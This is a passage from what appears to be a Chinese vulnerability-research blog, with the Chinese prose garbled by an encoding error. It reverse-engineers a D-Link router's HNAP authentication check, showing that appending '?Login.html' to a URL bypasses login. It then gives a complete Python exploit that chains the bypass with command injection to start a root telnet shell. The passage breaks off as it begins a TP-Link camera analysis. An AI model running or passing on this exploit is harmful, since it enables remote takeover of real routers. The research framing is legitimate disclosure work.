</span><br><span class="line">        004d01b4 00              ??         00h</span><br><span class="line">        004d01b5 00              ??         00h</span><br><span class="line">        004d01b6 00              ??         00h</span><br><span class="line">        004d01b7 00              ??         00h</span><br><span class="line">        004d01b8 00              ??         00h</span><br><span class="line">        004d01b9 00              ??         00h</span><br><span class="line">        004d01ba 00              ??         00h</span><br><span class="line">        004d01bb 00              ??         00h</span><br><span class="line">        004d01bc 00              ??         00h</span><br><span class="line">        004d01bd 00              ??         00h</span><br><span class="line">        004d01be 00              ??         00h</span><br><span class="line">        004d01bf 00              ??         00h</span><br><span class="line">        004d01c0 47  65  74       ds         &quot;GetDeviceSettings&quot;</span><br><span class="line">                 44  65  76 </span><br><span class="line">                 69  63  65 </span><br><span class="line">        004d01d4 00              ??         00h</span><br><span class="line">        004d01d5 00              ??         00h</span><br><span class="line">        004d01d6 00              ??         00h</span><br><span class="line">        004d01d7 00              ??         00h</span><br><span class="line">        004d01d8 00              ??         00h</span><br><span class="line">        004d01d9 00              ??         00h</span><br><span class="line">        004d01da 00              ??         00h</span><br><span class="line">        004d01db 00              ??         00h</span><br><span class="line">        004d01dc 00              ??         00h</span><br><span class="line">        004d01dd 00              ??         00h</span><br><span class="line">        004d01de 00              ??         00h</span><br><span class="line">        004d01df 00              ??         00h</span><br><span class="line">        004d01e0 62  6c  6f       ds         &quot;blockedPage.html&quot;</span><br><span class="line">                 63  6b  65 </span><br><span class="line">                 64  50  61 </span><br><span class="line">........</span><br></pre></td></tr></table></figure></div>

<p>ç±»ä¼¼äºè®¸å¤šå­—ç¬¦ä¸²çš„é›†åˆï¼Œå¹¶ä¸”ä¸¤ä¸¤ä¹‹é—´åç§»é‡éƒ½æ˜¯ 0x20ã€‚çŒœæµ‹æ­¤å¤„æ˜¯æŸç§å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œé€šè¿‡ PTR_DAT_004d0194 åŠ ä¸Šåç§»é‡è¿›è¡Œç´¢å¼•ã€‚</p>
<p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ IDA è¿›è¡Œè¿›ä¸€æ­¥çš„éªŒè¯ï¼Œå°† prog.cgi åŠ è½½åˆ° IDA ä¸­ï¼Œè·³è½¬åˆ°ç›®æ ‡åœ°å€å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:004D01A0 aGetcaptchasett:.ascii &quot;GetCAPTCHAsetting&quot;&lt;0&gt;</span><br><span class="line">.data:004D01A0                                          # DATA XREF: sub_423ECC+D8â†‘o</span><br><span class="line">.data:004D01A0                                          # sub_423ECC+12Câ†‘o ...</span><br><span class="line">.data:004D01B2                 .align 4</span><br><span class="line">.data:004D01C0 aGetdevicesetti_3:.ascii &quot;GetDeviceSettings&quot;&lt;0&gt;</span><br><span class="line">.data:004D01D2                 .align 4</span><br><span class="line">.data:004D01E0 aBlockedpageHtm:.ascii &quot;blockedPage.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D01F1                 .align 4</span><br><span class="line">.data:004D0200 aMobileloginHtm:.ascii &quot;MobileLogin.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D0211                 .align 4</span><br><span class="line">.data:004D0220 aLoginHtml:     .ascii &quot;Login.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D022B                 .align 5</span><br><span class="line">.data:004D0240 aEulaHtml:      .ascii &quot;EULA.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D024A                 .align 5</span><br><span class="line">.data:004D0260 aIndexHtml_2:   .ascii &quot;Index.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D026B                 .align 5</span><br><span class="line">.data:004D0280 aWizardHtml:    .ascii &quot;Wizard.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D028C                 .align 5</span><br><span class="line">.data:004D02A0 aHnap1_5:       .ascii &quot;/HNAP1/&quot;&lt;0&gt;</span><br><span class="line">.data:004D02A8                 .align 5</span><br><span class="line">.data:004D02C0 aEulaTermHtml:  .ascii &quot;EULA_Term.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02CF                 .align 5</span><br><span class="line">.data:004D02E0 aEulaPrivacyHtm:.ascii &quot;EULA_Privacy.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02F2                 .align 4</span><br></pre></td></tr></table></figure></div>

<p>IDA å¯¹è¿™éƒ¨åˆ†æ•°æ®è¯†åˆ«çš„æ›´åŠ å‡†ç¡®ï¼Œæ­£å¦‚æˆ‘ä»¬çš„çŒœæµ‹ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ã€‚</p>
<p>é€šè¿‡å¯¹åˆ—è¡¨é¦–éƒ¨åœ°å€çš„äº¤å‰å¼•ç”¨ï¼Œèƒ½æ‰¾åˆ°ä½¿ç”¨è¿™éƒ¨åˆ†æ•°æ®çš„ä»£ç ï¼Œå…¶ä¸­æœ€å…³é”®çš„å‡½æ•°æ˜¯ 00423eccï¼Œåç¼–è¯‘ç»“æœå¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">allow_urls</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *pcVar2;</span><br><span class="line">  uint uri_index;</span><br><span class="line">  <span class="type">char</span> acStack2092 [<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> acStack1068 [<span class="number">1024</span>];</span><br><span class="line">  undefined auStack44 [<span class="number">40</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(acStack2092,<span class="number">0</span>,<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack1068,<span class="number">0</span>,<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(auStack44,<span class="string">&quot;&lt;title&gt;401 Not Authorized&lt;/title&gt;\r\n&quot;</span>,<span class="number">0x24</span>);</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(param_1 + <span class="number">0xe4</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    uri_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (uri_index &lt; <span class="number">0xb</span>) &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(acStack2092,<span class="number">0x400</span>,<span class="string">&quot;%s%s&quot;</span>,<span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>,</span><br><span class="line">               s_GetCAPTCHAsetting_004d01a0 + uri_index * <span class="number">0x20</span>);</span><br><span class="line">      <span class="built_in">snprintf</span>(acStack1068,<span class="number">0x400</span>,<span class="string">&quot;\&quot;%s%s\&quot;&quot;</span>,<span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>,</span><br><span class="line">               s_GetCAPTCHAsetting_004d01a0 + uri_index * <span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> ((*(<span class="type">int</span> *)(param_1 + <span class="number">0xe4</span>) == <span class="number">0</span>) ||</span><br><span class="line">         (pcVar2 = <span class="built_in">strstr</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xe4</span>),s_GetCAPTCHAsetting_004d01a0 + uri_index *<span class="number">0x20</span></span><br><span class="line">                         ), pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*(<span class="type">int</span> *)(param_1 + <span class="number">0xd4</span>) != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">           ((iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xd4</span>),acStack2092), iVar1 == <span class="number">0</span> ||</span><br><span class="line">            (iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xd4</span>),acStack1068), iVar1 == <span class="number">0</span>)))) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(s_GetCAPTCHAsetting_004d01a0 + uri_index * <span class="number">0x20</span>,<span class="string">&quot;/HNAP1/&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (((iVar1 != <span class="number">0</span>) || (*(<span class="type">int</span> *)(param_1 + <span class="number">200</span>) == <span class="number">0</span>)) ||</span><br><span class="line">           (iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">200</span>),<span class="string">&quot;POST&quot;</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      uri_index = uri_index + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((*(<span class="type">int</span> *)(param_1 + <span class="number">0x110</span>) == <span class="number">0</span>) ||</span><br><span class="line">     ((iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0x110</span>),<span class="string">&quot;QRSMobile&quot;</span>,<span class="number">9</span>), iVar1 != <span class="number">0</span> &amp;&amp;</span><br><span class="line">      ((pcVar2 = <span class="built_in">strstr</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0x110</span>),<span class="string">&quot;Android&quot;</span>), pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">       (iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0x110</span>),<span class="string">&quot;Mozilla&quot;</span>,<span class="number">7</span>), iVar1 == <span class="number">0</span>)))))) &#123;</span><br><span class="line">    iVar1 = FUN_0042159c(param_1);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">       ((*(<span class="type">int</span> *)(param_1 + <span class="number">200</span>) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">200</span>),<span class="string">&quot;POST&quot;</span>), iVar1 == <span class="number">0</span>)))) &#123;</span><br><span class="line">      FUN_00424498(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      websDefaultHandler(param_1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;/Index.html&quot;</span>,<span class="string">&quot;/Index.html&quot;</span>,*(undefined4 *)(param_1 +<span class="number">0xf8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    websRspNotAuth(param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°æ¥æ”¶çš„å‚æ•°æ˜¯ webs_t ç»“æ„ä½“ï¼Œç”¨äºä»£è¡¨ä¸€ä¸ª web è¯·æ±‚ã€‚å¯ä»¥é€šè¿‡ä¸æ–­çš„äº¤å‰å¼•ç”¨æ‰¾åˆ°æºå‡½æ•° websSecurityHandlerï¼Œgohead ä¸­åŒåå‡½æ•°æè¿°å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">websSecurityHandler implements the default security policy. It operates as a URL handler and is installed to run as the very first URL handler. If you require a replacement security policy, delete the websSecurityHandler and install your own with websUrlHandlerDefine.</span><br></pre></td></tr></table></figure></div>

<p>ç®€å•åˆ†æä¸Šé¢æåˆ°çš„å‡½æ•°é€»è¾‘ï¼Œå‘ç°ä»–ä¼šå–å‡º webs_t ä¸­ä¸‹æ ‡ä¸º 0xe4 çš„æ•°æ®å¹¶åˆ¤æ–­å­—ç¬¦ä¸²åˆ—è¡¨ä¸­çš„æ•°æ®æ˜¯å¦å‡ºç°åœ¨å…¶ä¸­ã€‚é€šè¿‡åˆ†æ main å‡½æ•°å¯ä»¥ç¡®å®šï¼Œ0xe4 ä½ç½®å­˜æ”¾çš„æ˜¯ Request_URI æŒ‡é’ˆï¼Œè¡¨ç¤ºç”¨æˆ·è®¿é—®çš„ URL é“¾æ¥ã€‚</p>
<p>å¦‚æœå­—ç¬¦ä¸²åˆ—è¡¨ä¸­çš„æ•°æ®å‡ºç°åœ¨ Request_URI ä¸­ï¼Œåˆ™å…è®¸è®¿é—®ã€‚è¿›ä¸€æ­¥åˆ†æå‘ç°è¿™äº›ç¡¬ç¼–ç çš„æ¥å£é»˜è®¤éƒ½æ˜¯ä¸éœ€è¦èº«ä»½éªŒè¯å°±èƒ½è®¿é—®çš„ã€‚ä¾‹å¦‚ Login.html æ˜¯ç™»å½•æ¥å£ï¼ŒEULA.html æ˜¯ç”¨æˆ·éšç§åè®®ç­‰ã€‚</p>
<p>æ­¤å‡½æ•°çš„é—®é¢˜åœ¨äºï¼Œå®ƒä½¿ç”¨äº† strstr å‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœç”¨æˆ·è®¿é—®ä¸€ä¸ªæœ¬æ¥éœ€è¦èº«ä»½éªŒè¯çš„é“¾æ¥ï¼Œç„¶ååœ¨é“¾æ¥çš„åé¢æ·»åŠ è¿™äº›å­—ç¬¦ä¸²å³å¯ç»•è¿‡èº«ä»½éªŒè¯é€»è¾‘ã€‚</p>
<p>æ¼æ´æµ‹è¯•ï¼š</p>
<p>é¦–å…ˆæŠ“åŒ…è·å–ä¸€ä¸ªéœ€è¦èº«ä»½éªŒè¯çš„ HTTP è¯·æ±‚ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /HNAP1/ HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">Content-Length: 302</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">HNAP_AUTH: 00DAB25BFD3EBF8FAD03E60E5616BF44 1598580346156</span><br><span class="line">SOAPAction: &quot;http://purenetworks.com/HNAP1/GetIPv6Status&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Content-Type: text/xml; charset=UTF-8</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Referer: http://192.168.0.1/Home.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: uid=uFXfaJBA</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;GetIPv6Status xmlns=&quot;http://purenetworks.com/HNAP1/&quot; /&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªè¯·æ±‚å‘é€åˆ°è·¯ç”±å™¨å¯ä»¥è¿”å›æ­£å¸¸çš„ç»“æœã€‚ç„¶åæ„é€ ä¸€ä¸ªéæ³•çš„è¯·æ±‚ï¼Œåœ¨è®¿é—®é“¾æ¥ä¸­æ·»åŠ  â€˜?Login.htmlâ€™ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/aubypass-2.png"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°æ„é€ çš„æ¶æ„ payload èƒ½å¤Ÿç»•è¿‡èº«ä»½éªŒè¯ç›´æ¥è®¿é—®æ•æ„Ÿæ¥å£ã€‚</p>
<p>æ­¤å¤–æˆ‘ä»¬å¯ä»¥ç»“åˆè¿™ä¸ªèº«ä»½éªŒè¯æ¼æ´ä»¥åŠ<a href="https://wzt.ac.cn/2019/09/18/D-Link_BUG/">å‘½ä»¤æ³¨å…¥æ¼æ´</a>å®ç°æ— æ¡ä»¶çš„ RCEã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">telnet_payload = <span class="string">r&quot;1.com/&amp;amp;$(telnetd$IFS$9-l$IFS$9/bin/sh$IFS$9-b$IFS$9&#x27;0.0.0.0&#x27;)&amp;amp;&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;uid&quot;</span>: <span class="string">&quot;CataLpa&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/xml&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;SOAPACTION&quot;</span>: <span class="string">&quot;\&quot;http://purenetworks.com/HNAP1/SetWebFilterSettings\&quot;&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">burp0_data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;soap:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot; xmlns:soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;\n&lt;soap:Body&gt;\n&lt;SetWebFilterSettings&gt;\n\t&lt;WebFilterMethod&gt;DENY&lt;/WebFilterMethod&gt;\n\t&lt;NumberOfEntry&gt;1&lt;/NumberOfEntry&gt;\n\t&lt;WebFilterURLs&gt;\n\t\t&lt;string&gt;&quot;</span> + telnet_payload + <span class="string">&quot;&lt;/string&gt;\n\t&lt;/WebFilterURLs&gt;\n&lt;/SetWebFilterSettings&gt;\n&lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Usage: python DIR-878.py &lt;ip&gt;&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    IP = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Send payload to &quot;</span> + IP)</span><br><span class="line">    burp0_url = <span class="string">&quot;http://&quot;</span> + IP + <span class="string">&quot;:80/HNAP1/?Login.html&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;200&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res.status_code):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Exploit success!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] telnet &quot;</span> + IP)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Exploit failed. Bug fixed :(&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Exploit failed.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>TP-Link IP43AN</title>
    <url>/2020/05/23/IPC43AN/</url>
    <content><![CDATA[<h2 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h2><p>é¦–å…ˆè·å–æ‘„åƒå¤´çš„å›ºä»¶ï¼Œä¸‹è½½åœ°å€ï¼š <a class="link"   href="https://service.tp-link.com.cn/detail_download_7631.html" >https://service.tp-link.com.cn/detail_download_7631.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<span id="more"></span>

<p>å›ºä»¶æœ¬èº«æ²¡æœ‰åŠ å¯†ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ binwalk è§£å¼€ï¼Œè§£å¼€ä¹‹åå¾—åˆ°ä¸€ä¸ªæ ‡å‡†çš„ linux æ–‡ä»¶ç³»ç»Ÿï¼Œå­˜åœ¨æ¼æ´çš„æ–‡ä»¶æ˜¯ &#x2F;usr&#x2F;bin&#x2F;dsdã€‚æ­¤äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ 32bit ARM æ¶æ„çš„ï¼ŒIDA å¯ä»¥ç›´æ¥è¿›è¡Œåç¼–è¯‘ï¼Œä½†æ˜¯åœ¨å®é™…æ“ä½œä¸­ï¼ŒIDA çš„äº¤å‰å¼•ç”¨è¯†åˆ«ä¸Šé¢å­˜åœ¨ä¸€å®šçš„é—®é¢˜ï¼Œæ‰€ä»¥æ¨èæ­é… Ghidra ä½¿ç”¨ã€‚</p>
<p>åœ¨åˆ†æä¹‹å‰éœ€è¦ä»‹ç»ä¸€ä¸‹å¦‚ä½•æ‰èƒ½å®šä½å…³é”®æ–‡ä»¶ã€‚æ‘„åƒå¤´ä¹‹ç±»çš„è®¾å¤‡ä¸€èˆ¬éƒ½å­˜åœ¨ web ç®¡ç†ç•Œé¢ï¼Œæ‰€ä»¥æ‹¿åˆ°å›ºä»¶ä¹‹åå¯ä»¥å…ˆå°è¯•å¯»æ‰¾åŒ…å« http å­—æ ·çš„ web serverï¼ŒæŸäº›è®¾å¤‡è€ƒè™‘åˆ°æ€§èƒ½ç­‰é—®é¢˜ï¼Œå¯èƒ½ä¼šæŠŠæ‰€æœ‰é€»è¾‘é›†æˆåœ¨ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œè€Œå…¶ä»–ä¸€äº›è®¾å¤‡æ€§èƒ½è¾ƒå¼ºï¼Œæˆ–è€…åº”ç”¨äº†æŸäº›æ¡†æ¶ï¼Œåˆ™ä¼šæŠŠ web æœåŠ¡å™¨å’Œå…·ä½“çš„ä¸šåŠ¡é€»è¾‘åˆ†æ•£å¼€ã€‚</p>
<p>æœ¬ä¾‹ä¸­ web æœåŠ¡å™¨ä½äº &#x2F;usr&#x2F;sbin&#x2F;uhttpdï¼Œå®ƒè´Ÿè´£è§£æ web è¯·æ±‚ï¼Œä»¥åŠä¸€éƒ¨åˆ†è®¾å¤‡åŠŸèƒ½ã€‚é€šè¿‡è¿›ä¸€æ­¥åˆ†ææ­¤ç¨‹åºï¼Œå¯ä»¥å‘ç°æ›´å¤šçš„ä¸šåŠ¡é€»è¾‘(ä¸»è¦å’Œè®¾å¤‡çš„å‚æ•°è®¾ç½®ç›¸å…³)è¢«æ”¾ç½®åœ¨äº† &#x2F;usr&#x2F;bin&#x2F;dsd ä¸­ï¼Œæ‰€ä»¥ dsd æ–‡ä»¶å°±æ˜¯æˆ‘ä»¬çš„ä¸»è¦åˆ†æå¯¹è±¡ã€‚</p>
<p>IDA ç›´æ¥æ‰“å¼€ dsd æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡æœç´¢å­—ç¬¦ä¸²çš„æ–¹å¼å°è¯•å®šä½å…³é”®å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ç»“åˆæŠ“åŒ…æ‰‹æ®µæ‹¿åˆ°ä¸€äº›å…³é”®çš„å­—ç¬¦ä¸²ä¿¡æ¯ï¼Œç»è¿‡åˆ†æï¼Œå‘ç°å…³é”®å‡½æ•°æ˜¯ 0x155FCï¼ŒæŠ“åŒ…æ ·æœ¬ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /stok=9ffcd0b497aa1902380ea5d5e1ee2eea/ds HTTP/1.1</span><br><span class="line">Host: 192.168.3.20</span><br><span class="line">Content-Length: 326</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.3.20</span><br><span class="line">Referer: http://192.168.3.20/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;system&quot;:&#123;&quot;config_recovery&quot;:&#123;&#125;,&quot;method&quot;:&quot;do&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°çš„å‡ ä¸ªå…³é”®ä¿¡æ¯ï¼š</p>
<ol>
<li>å¤„ç†çš„æ•°æ®æ˜¯ json æ ¼å¼ï¼ŒåŸºæœ¬å‚æ•°åŒ…æ‹¬ methodã€request</li>
<li>å‡½æ•°æ ¹æ®ä¸åŒçš„ method ä¼šåšä¸åŒçš„å¤„ç†ï¼Œå…·ä½“åŒ…å« getã€addã€deleteã€setã€do</li>
<li>å¤„ç†é€»è¾‘ç±»ä¼¼äº switch case ç»“æ„ï¼Œæ ¹æ®ä¸åŒçš„ request è°ƒç”¨ä¸åŒçš„ handlerã€‚</li>
</ol>
<p>å…³é”®çš„ä»£ç ç‰‡æ®µï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( (v33 - <span class="number">1</span>) &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*&amp;aDsHandleMethod[<span class="number">4</span> * v33 + <span class="number">644</span>])(v3) )<span class="comment">// æ ¹æ® method å†³å®šè°ƒç”¨å“ªä¸ª handler</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_signal_handle&quot;</span>, <span class="number">3148</span>);</span><br><span class="line">      v32 = <span class="string">&quot;Signal handle failed.&quot;</span>;</span><br><span class="line">LABEL_81:</span><br><span class="line">      <span class="built_in">printf</span>(v32);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>è®¿é—®äº† aDsHandleMethod å…¨å±€å˜é‡ï¼Œæ ¹æ®ä¸åŒçš„ method è°ƒç”¨ä¸åŒçš„ handlerï¼Œåˆ©ç”¨ IDA æŸ¥æ‰¾å¯ä»¥å‘ç° 5 ä¸ª handler å‡½æ•°æŒ‡é’ˆï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:00029A24 method_get_handler DCD get_handler+1</span><br><span class="line">.rodata:00029A28 method_add_handler DCD three_handler+1</span><br><span class="line">.rodata:00029A2C method_delete_handler DCD three_handler+1</span><br><span class="line">.rodata:00029A30 method_set_handler DCD three_handler+1</span><br><span class="line">.rodata:00029A34 method_do_handler DCD do_handler+1</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ç¬¬ 2 ~ 4 ä¸ª handler å…±ç”¨ä¸€ä¸ªå‡½æ•°ã€‚</p>
<p>æ‰¾åˆ° do_handlerï¼Œä»£ç å¦‚ä¸‹</p>
